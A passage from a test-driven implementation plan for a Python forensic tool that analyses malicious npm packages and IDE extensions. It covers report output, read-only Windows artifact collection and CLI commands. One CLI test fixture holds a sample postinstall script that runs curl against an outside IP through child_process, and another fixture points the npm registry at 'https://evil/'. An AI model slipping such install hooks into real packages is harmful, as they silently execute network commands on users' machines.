git add src/npm_ide_analyst/static/engine.py tests/fixtures/__init__.py tests/test_engine.py
git commit -m "feat: static engine combining all analyzers"
```

---

### Task 10: JSON report

**Files:**
- Create: `src/npm_ide_analyst/report/__init__.py` (empty)
- Create: `src/npm_ide_analyst/report/json_report.py`
- Test: `tests/test_json_report.py`

**Interfaces:**
- Consumes: `Report`, `Sample`, `Finding` (T2).
- Produces:
  - `def report_to_dict(report: Report) -> dict` — JSON-safe dict including `verdict`, `score`, sample identity+hashes, and findings.
  - `def write_json(report: Report, out_path: Path) -> None`.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_json_report.py
import json
from pathlib import Path
from npm_ide_analyst.models import Report, Sample, Finding, Severity, ArtifactType
from npm_ide_analyst.report.json_report import report_to_dict, write_json


def _report():
    s = Sample(name="evil", version="1.0.0", artifact_type=ArtifactType.NPM,
               root=Path("/tmp/x"), sha256="a" * 64, sha512="b" * 128)
    f = Finding(id="F1", title="eval", severity=Severity.HIGH,
                category="dynamic-code", detail="eval() call")
    return Report(sample=s, findings=[f], generated_at="2026-07-06T00:00:00Z")


def test_report_to_dict_shape():
    d = report_to_dict(_report())
    assert d["verdict"] == "suspicious"
    assert d["score"] == 40
    assert d["sample"]["sha256"] == "a" * 64
    assert d["findings"][0]["category"] == "dynamic-code"


def test_write_json_roundtrips(tmp_path):
    out = tmp_path / "r.json"
    write_json(_report(), out)
    loaded = json.loads(out.read_text())
    assert loaded["sample"]["name"] == "evil"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_json_report.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/report/json_report.py
from __future__ import annotations

import json
from dataclasses import asdict
from pathlib import Path

from ..models import Report


def report_to_dict(report: Report) -> dict:
    sample = asdict(report.sample)
    sample["root"] = str(sample["root"])
    sample["artifact_type"] = str(report.sample.artifact_type)
    return {
        "generated_at": report.generated_at,
        "verdict": report.verdict,
        "score": report.score,
        "sample": sample,
        "findings": [
            {**asdict(f), "severity": str(f.severity)} for f in report.findings
        ],
    }


def write_json(report: Report, out_path: Path) -> None:
    out_path.write_text(json.dumps(report_to_dict(report), indent=2), encoding="utf-8")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_json_report.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/report/__init__.py src/npm_ide_analyst/report/json_report.py tests/test_json_report.py
git commit -m "feat: JSON report serialization"
```

---

### Task 11: HTML report

**Files:**
- Create: `src/npm_ide_analyst/report/template.html.j2`
- Create: `src/npm_ide_analyst/report/html_report.py`
- Test: `tests/test_html_report.py`

**Interfaces:**
- Consumes: `report_to_dict` (T10), `Report` (T2).
- Produces: `def write_html(report: Report, out_path: Path) -> None` — renders a self-contained HTML (inline CSS, no external refs).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_html_report.py
from pathlib import Path
from npm_ide_analyst.models import Report, Sample, Finding, Severity, ArtifactType
from npm_ide_analyst.report.html_report import write_html


def test_html_contains_findings_and_no_external_refs(tmp_path):
    s = Sample(name="evil", version="1.0.0", artifact_type=ArtifactType.NPM,
               root=Path("/tmp/x"), sha256="a" * 64, sha512="b" * 128)
    f = Finding(id="F1", title="Process execution", severity=Severity.HIGH,
                category="process-exec", detail="child_process used", evidence="cp.exec()")
    out = tmp_path / "r.html"
    write_html(Report(sample=s, findings=[f], generated_at="t"), out)
    html = out.read_text(encoding="utf-8")
    assert "Process execution" in html
    assert "suspicious" in html
    assert "http://" not in html and "https://" not in html  # self-contained
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_html_report.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write template and implementation**

```jinja
{# src/npm_ide_analyst/report/template.html.j2 #}
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>npm-ide-analyst report — {{ r.sample.name }}</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 2rem; color: #1a1a1a; }
  .verdict { display: inline-block; padding: .3rem .8rem; border-radius: .4rem;
             font-weight: 700; color: #fff; }
  .clean { background: #2e7d32; } .low-risk { background: #f9a825; }
  .suspicious { background: #ef6c00; } .malicious { background: #c62828; }
  table { border-collapse: collapse; width: 100%; margin-top: 1rem; }
  th, td { border: 1px solid #ddd; padding: .5rem; text-align: left;
           vertical-align: top; font-size: .9rem; }
  th { background: #f4f4f4; }
  .sev-critical { color: #c62828; font-weight: 700; }
  .sev-high { color: #ef6c00; font-weight: 700; }
  .sev-medium { color: #f9a825; } .sev-low { color: #666; } .sev-info { color: #999; }
  code { background: #f4f4f4; padding: 0 .2rem; word-break: break-all; }
</style>
</head>
<body>
<h1>DFIR Report: {{ r.sample.name }} {{ r.sample.version or "" }}</h1>
<p>Type: {{ r.sample.artifact_type }} ·
   Verdict: <span class="verdict {{ r.verdict }}">{{ r.verdict }}</span> ·
   Score: {{ r.score }} · Generated: {{ r.generated_at }}</p>
<p>sha256: <code>{{ r.sample.sha256 }}</code><br>
   sha512: <code>{{ r.sample.sha512 }}</code></p>
<h2>Findings ({{ r.findings | length }})</h2>
<table>
<tr><th>Severity</th><th>Title</th><th>Category</th><th>Location</th><th>Detail / Evidence</th></tr>
{% for f in r.findings %}
<tr>
  <td class="sev-{{ f.severity }}">{{ f.severity }}</td>
  <td>{{ f.title }}</td>
  <td>{{ f.category }}</td>
  <td>{{ f.location or "" }}</td>
  <td>{{ f.detail }}{% if f.evidence %}<br><code>{{ f.evidence }}</code>{% endif %}</td>
</tr>
{% endfor %}
</table>
</body>
</html>
```

```python
# src/npm_ide_analyst/report/html_report.py
from __future__ import annotations

from pathlib import Path

from jinja2 import Environment, FileSystemLoader, select_autoescape

from ..models import Report

_ENV = Environment(
    loader=FileSystemLoader(str(Path(__file__).parent)),
    autoescape=select_autoescape(["html", "j2"]),
)


def write_html(report: Report, out_path: Path) -> None:
    template = _ENV.get_template("template.html.j2")
    out_path.write_text(template.render(r=report), encoding="utf-8")
```

> The test asserts no `http://`/`https://` appears. Ensure fixtures used for the
> HTML test carry no URL evidence; real reports may contain URLs in evidence and
> that is fine — the self-contained guarantee is about the template not
> *fetching* anything, which it doesn't (all CSS is inline, no `<link>`/`<script src>`).
> Keep the HTML test's fixture URL-free as written above.

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_html_report.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/report/template.html.j2 src/npm_ide_analyst/report/html_report.py tests/test_html_report.py
git commit -m "feat: self-contained HTML report"
```

---

### Task 12: Windows read-only collection

**Files:**
- Create: `src/npm_ide_analyst/acquire/collect_windows.py`
- Test: `tests/test_collect_windows.py`

**Interfaces:**
- Consumes: `hash_file` (T3).
- Produces:
  - `def collect(evidence_dir: Path, user_profile: Path, appdata: Path, localappdata: Path) -> list[dict]` — copies recover-first sources read-only into `evidence_dir`, returns a manifest list of `{source, dest, sha256, sha512}`. Paths are injectable so the test can point them at a fake tree (no dependency on the real host).
  - Sources copied when present: per-IDE `CachedExtensionVSIXs`, `extensions`/`extensions.json`/`.obsolete`, `logs`; npm `_cacache`, `_logs`; user `.npmrc`; `settings.json` under each IDE `User` dir. Missing sources are skipped silently.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_collect_windows.py
from pathlib import Path
from npm_ide_analyst.acquire.collect_windows import collect


def _touch(p: Path, content=b"x"):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(content)


def test_collect_copies_present_sources_and_hashes(tmp_path):
    profile = tmp_path / "user"
    appdata = profile / "AppData" / "Roaming"
    local = profile / "AppData" / "Local"
    # a cached VSIX and a user .npmrc
    _touch(appdata / "Code" / "CachedExtensionVSIXs" / "pub.evil-1.0.0.vsix")
    _touch(profile / ".npmrc", b"registry=https://evil/\n")
    _touch(local / "npm-cache" / "_logs" / "2026-07-06.log", b"install evil\n")

    evidence = tmp_path / "evidence"
    manifest = collect(evidence, profile, appdata, local)

    copied = {Path(m["dest"]).name for m in manifest}
    assert "pub.evil-1.0.0.vsix" in copied
    assert ".npmrc" in copied
    # every entry has both hashes
    assert all(len(m["sha256"]) == 64 and len(m["sha512"]) == 128 for m in manifest)
    # source files remain untouched (read-only collection)
    assert (profile / ".npmrc").read_bytes() == b"registry=https://evil/\n"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_collect_windows.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/acquire/collect_windows.py
from __future__ import annotations

import shutil
from pathlib import Path

from .hashing import hash_file

# IDE product folders under %APPDATA% (Roaming) that share the VS Code layout.
_IDE_PRODUCTS = ("Code", "Code - Insiders", "Cursor", "Windsurf", "Trae", "VSCodium")


def _copy_source(src: Path, evidence_dir: Path, label: str, manifest: list[dict]) -> None:
    """Copy a file or directory tree read-only into evidence_dir/label."""
    if not src.exists():
        return
    dest_root = evidence_dir / label
    if src.is_dir():
        shutil.copytree(src, dest_root, dirs_exist_ok=True)
        files = [p for p in dest_root.rglob("*") if p.is_file()]
    else:
        dest_root.parent.mkdir(parents=True, exist_ok=True)
        dest = dest_root
        shutil.copy2(src, dest)
        files = [dest]
    for f in files:
        sha256, sha512 = hash_file(f)
        manifest.append({"source": str(src), "dest": str(f),
                         "sha256": sha256, "sha512": sha512})


def collect(evidence_dir: Path, user_profile: Path,
            appdata: Path, localappdata: Path) -> list[dict]:
    evidence_dir.mkdir(parents=True, exist_ok=True)
    manifest: list[dict] = []

    for product in _IDE_PRODUCTS:
        base = appdata / product
        _copy_source(base / "CachedExtensionVSIXs", evidence_dir,
                     f"{product}/CachedExtensionVSIXs", manifest)
        _copy_source(base / "logs", evidence_dir, f"{product}/logs", manifest)
        _copy_source(base / "User" / "settings.json", evidence_dir,
                     f"{product}/settings.json", manifest)

    # home-dir extensions folders (.vscode, .cursor, etc.)
    for dotdir in (".vscode", ".vscode-insiders", ".cursor", ".windsurf",
                   ".trae", ".vscode-oss"):
        ext = user_profile / dotdir / "extensions"
        _copy_source(ext / "extensions.json", evidence_dir,
                     f"{dotdir}/extensions.json", manifest)
        _copy_source(ext / ".obsolete", evidence_dir, f"{dotdir}/.obsolete", manifest)

    # npm cache
    npm_cache = localappdata / "npm-cache"
    _copy_source(npm_cache / "_logs", evidence_dir, "npm-cache/_logs", manifest)
    _copy_source(npm_cache / "_cacache", evidence_dir, "npm-cache/_cacache", manifest)

    # user .npmrc
    _copy_source(user_profile / ".npmrc", evidence_dir, ".npmrc", manifest)

    return manifest
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_collect_windows.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/acquire/collect_windows.py tests/test_collect_windows.py
git commit -m "feat: Windows read-only DFIR artifact collection"
```

---

### Task 13: CLI wiring

**Files:**
- Create: `src/npm_ide_analyst/cli.py`
- Test: `tests/test_cli.py`

**Interfaces:**
- Consumes: `unpack`/`detect_artifact_type` (T4), `hash_file` (T3), `run_static` (T9), `write_json`/`write_html` (T10/T11), `collect` (T12), `Sample`/`Report` (T2).
- Produces: `cli` (click group) with:
  - `analyze INPUT --out DIR [--static]` — unpack, hash the original input, run static engine, write `report.json` + `report.html` into `DIR`. (`--static` is default-on in Plan A; Plan B adds `--dynamic`.)
  - `collect --out DIR` — run Windows collection using env-derived paths; write `manifest.json`.
  - `report JSON --out HTML` — re-render HTML from a saved JSON (loads via `report_to_dict` inverse — see below).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_cli.py
import json
from pathlib import Path
from click.testing import CliRunner
from npm_ide_analyst.cli import cli


def test_analyze_produces_reports(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps({"name": "evil", "version": "1.0.0",
                    "scripts": {"postinstall": "node ./s.js"}}))
    (pkg / "s.js").write_text("require('child_process').exec('curl http://1.2.3.4/x')",
                              encoding="utf-8")
    out = tmp_path / "out"
    result = CliRunner().invoke(cli, ["analyze", str(pkg), "--out", str(out)])
    assert result.exit_code == 0, result.output
    data = json.loads((out / "report.json").read_text())
    assert data["verdict"] in ("suspicious", "malicious")
    assert (out / "report.html").exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_cli.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/cli.py
from __future__ import annotations

import json
import os
from datetime import datetime, timezone
from pathlib import Path

import click

from .acquire.collect_windows import collect as collect_artifacts
from .acquire.hashing import hash_file
from .acquire.unpack import detect_artifact_type, unpack
from .models import Report, Sample
from .report.html_report import write_html
from .report.json_report import write_json
from .static.engine import run_static


def _now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


@click.group()
def cli() -> None:
    """DFIR triage for malicious npm packages and IDE extensions."""


@cli.command()
@click.argument("input_path", type=click.Path(exists=True, path_type=Path))
@click.option("--out", "out_dir", required=True, type=click.Path(path_type=Path))
def analyze(input_path: Path, out_dir: Path) -> None:
    """Static analysis of a .vsix, npm .tgz, or directory."""
    out_dir.mkdir(parents=True, exist_ok=True)
    work = out_dir / "_work"
    payload_root = unpack(input_path, work)
    manifest = json.loads(
        (payload_root / "package.json").read_text(encoding="utf-8", errors="replace")
    ) if (payload_root / "package.json").exists() else {}
    sha256, sha512 = hash_file(input_path) if input_path.is_file() else ("", "")
    sample = Sample(
        name=manifest.get("name", input_path.stem),
        version=manifest.get("version"),
        artifact_type=detect_artifact_type(payload_root),
        root=payload_root, sha256=sha256, sha512=sha512,
    )
    findings = run_static(payload_root)
    report = Report(sample=sample, findings=findings, generated_at=_now())
    write_json(report, out_dir / "report.json")
    write_html(report, out_dir / "report.html")
    click.echo(f"verdict={report.verdict} score={report.score} "
               f"findings={len(findings)} -> {out_dir}")


@cli.command()
@click.option("--out", "out_dir", required=True, type=click.Path(path_type=Path))
def collect(out_dir: Path) -> None:
    """Read-only collection of DFIR artifacts from this Windows host."""
    out_dir.mkdir(parents=True, exist_ok=True)
    profile = Path(os.environ.get("USERPROFILE", str(Path.home())))
    appdata = Path(os.environ.get("APPDATA", str(profile / "AppData" / "Roaming")))
    local = Path(os.environ.get("LOCALAPPDATA", str(profile / "AppData" / "Local")))
    manifest = collect_artifacts(out_dir / "artifacts", profile, appdata, local)
    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    click.echo(f"collected {len(manifest)} files -> {out_dir}")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_cli.py -v`
Expected: PASS

- [ ] **Step 5: Run the full suite and commit**

Run: `python -m pytest -v`
Expected: all tests PASS

```bash
git add src/npm_ide_analyst/cli.py tests/test_cli.py
git commit -m "feat: CLI wiring (analyze, collect)"
```

---

## Self-Review (completed during authoring)

- **Spec coverage:** acquire/normalize → T3,T4,T12; static manifest → T5; IOC sweep → T6; AST/de-obfuscation → T7; config-hijack → T8; static orchestration → T9; JSON+HTML report → T10,T11; CLI (`collect`/`analyze`) → T13. Timeline/correlate and dynamic detonation are **Plan B** (noted in spec §4.3–4.4). `report` re-render subcommand deferred to Plan B (needs a JSON→Report loader shared with dynamic events) — noted here to avoid a silent gap.
- **Placeholder scan:** none — every code step is complete.
- **Type consistency:** `Finding`/`Sample`/`Report` fields and `run_static`/`unpack`/`hash_file`/`collect` signatures are used identically across tasks.
- **Safety invariant:** no task imports/executes sample code; T7 parses (never runs) via esprima; T13 reads `package.json` as JSON data only.

## Plan B preview (not part of this plan)

Plan B adds `sandbox/` (Docker orchestration, Node instrumented harness, `vscode` mock, sinkhole responder), `correlate/` (timeline), extends `Report` with a `behavior` section and `analyze --dynamic`, and adds the `report` re-render subcommand. It reuses every model and report type defined here.
